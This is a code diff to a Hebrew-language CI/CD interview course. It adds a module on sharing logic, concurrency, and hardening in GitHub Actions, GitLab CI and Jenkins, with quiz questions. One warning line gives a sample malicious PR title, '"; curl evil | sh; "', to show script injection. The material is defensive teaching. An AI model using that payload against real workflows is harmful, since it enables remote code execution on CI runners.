@@ -129,6 +129,61 @@ jobs:
          "To disable plugins",
          x="build על ה-controller יכול לגשת לכל ה-credentials וה-config. agents נפרדים מבודדים אותו."),
       ]),
+
+  MOD("tools-in-practice", "בפועל: reuse, concurrency ו-hardening בשלושת הכלים",
+      "לשתף לוגיקה בין pipelines, למנוע deploys מקבילים, להגביל הרשאות של token, ולנעול actions וספריות לגרסה קבועה.",
+      [P("בראיון על כלי CI לא מספיק לדעת לכתוב job. שואלים איך מתחזקים מאה pipelines, איך מונעים שני deploys בו זמנית, ואיך pipeline לא הופך לפרצת אבטחה."),
+       TABLE(["צורך", "GitHub Actions", "GitLab CI", "Jenkins"],
+             ["שיתוף לוגיקה", "reusable workflow (`workflow_call`) ו-composite action", "`include:` ו-`extends:`", "Shared Library (`@Library`)"],
+             ["deploy אחד בכל פעם", "`concurrency:` עם group", "`resource_group:`", "`disableConcurrentBuilds()` או lockable resources"],
+             ["אישור ידני", "environment עם required reviewers", "`when: manual` ו-protected environments", "`input` step"],
+             ["DAG בין jobs", "`needs:`", "`needs:`", "`parallel` ו-stages"]),
+       CODE("""on: {push: {branches: [main]}}
+permissions:
+  contents: read
+  id-token: write
+concurrency:
+  group: deploy-prod
+  cancel-in-progress: false
+jobs:
+  deploy:
+    uses: acme/ci/.github/workflows/deploy.yml@v3
+    with: {env: prod}
+    secrets: inherit""", cap="token מינימלי, deploy אחד בכל פעם, לוגיקה משותפת מ-repo מרכזי"),
+       KEY("ל-deploy שמים `cancel-in-progress: false`: deploy חדש מחכה לקודם במקום לבטל אותו באמצע. לבדיקות על PR דווקא `true`, כדי לא לבזבז ריצות על commits ישנים."),
+       H("Hardening"),
+       TABLE(["סיכון", "הגנה"],
+             ["action של צד שלישי שונה אחרי tag", "נעילה ל-commit SHA מלא, ו-Dependabot לעדכונים"],
+             ["`GITHUB_TOKEN` עם הרשאות רחבות", "`permissions:` מינימלי ברמת workflow או job"],
+             ["`pull_request_target` מריץ קוד של fork עם סודות", "לא לעשות checkout לקוד ה-PR ב-trigger הזה"],
+             ["script injection מ-title של PR", "להעביר `${{ github.event.* }}` דרך env ולא ישירות ל-run"],
+             ["runner משותף שנשאר מלוכלך", "runners ephemeral, אחד לכל job"]),
+       TRAP("`run: echo \"${{ github.event.pull_request.title }}\"` משלב את הטקסט לתוך ה-script לפני ההרצה. title עם `\"; curl evil | sh; \"` רץ כפקודה. מעבירים את הערך דרך `env:` ומשתמשים במשתנה ה-shell."),
+       ASK("How do you share pipeline logic across 50 repositories?",
+           "How do you make sure two deploys to production never run at the same time?",
+           "How would you harden a GitHub Actions workflow?",
+           "What's risky about `pull_request_target`?"),
+      ],
+      [C("Which setting makes a GitHub Actions deploy wait for the running one instead of cancelling it?",
+         "`concurrency` with a group and `cancel-in-progress: false`",
+         "`strategy.fail-fast: false`",
+         "`timeout-minutes: 0`",
+         "`continue-on-error: true`",
+         x="concurrency group מבטיח ריצה אחת בכל פעם. עם cancel-in-progress: false, הריצה החדשה ממתינה."),
+       C("Why pin third-party actions to a full commit SHA?",
+         "A tag can be moved to different code, but a SHA can't",
+         "SHAs run faster than tags",
+         "Tags are not allowed in workflows",
+         "It hides the action from logs",
+         x="מי ששולט ב-repo של ה-action יכול להזיז tag לקוד זדוני. SHA מלא מצביע לקוד קבוע."),
+       C("What is the GitLab CI equivalent of a GitHub Actions concurrency group for deploys?",
+         "`resource_group`",
+         "`cache:key`",
+         "`artifacts:expire_in`",
+         "`only: main`",
+         x="resource_group גורם ל-jobs עם אותו שם קבוצה לרוץ אחד אחרי השני, כך שאין שני deploys במקביל."),
+      ], min=10),
+
  ],
 
  "recap": [
@@ -209,11 +264,11 @@ jobs:
      ("`timeout-minutes`", "timeout מגביל זמן ריצה, לא מקביליות."),
      ("`strategy.matrix`", "matrix מרבה ריצות."),
      x="concurrency group מבטיח שרק ריצה אחת עם אותו group רצה. cancel-in-progress קובע אם לבטל את הקודמת."),
-   F("security-ops", "How do you stop a shared CI template change from breaking every repository at once?",
-     ("Version the template and have consumers pin to a release", "נכון. שדרוג הוא החלטה של כל צרכן."),
-     ("Point everyone at the main branch", "כל commit ל-main ישבור את כולם."),
-     ("Copy the template into each repo", "העתקות מתפצלות."),
-     ("Disable the template", "זה מבטל את השימוש החוזר."),
-     x="tags לתבניות (workflows, components, libraries) מאפשרים לפרסם שינוי שובר כגרסה חדשה, ולתת לצוותים לעבור בקצב שלהם."),
+   F("tools-in-practice", "A workflow runs `echo \"${{ github.event.pull_request.title }}\"`. Why is that dangerous?",
+     ("The title is inserted into the script before it runs, so a crafted title can execute commands", "נכון. ה-expression מוחלף לפני שה-shell רץ, ותווים מיוחדים הופכים לקוד."),
+     ("PR titles can't be read by workflows", "workflows יכולים לקרוא את ה-title; הבעיה היא איך הוא משולב בפקודה."),
+     ("echo leaks the GITHUB_TOKEN", "echo של title לא מדפיס את ה-token; הסכנה היא הרצת פקודות שה-title מכיל."),
+     ("It slows the workflow on large PRs", "אורך ה-title לא משפיע על מהירות; זו בעיית אבטחה."),
+     x="`${{ }}` מוחלף בטקסט לפני ההרצה. מעבירים את הערך ל-`env: TITLE: ${{ github.event.pull_request.title }}` ומשתמשים ב-\"$TITLE\", כך שהוא נשאר נתון ולא קוד."),
  ],
 }
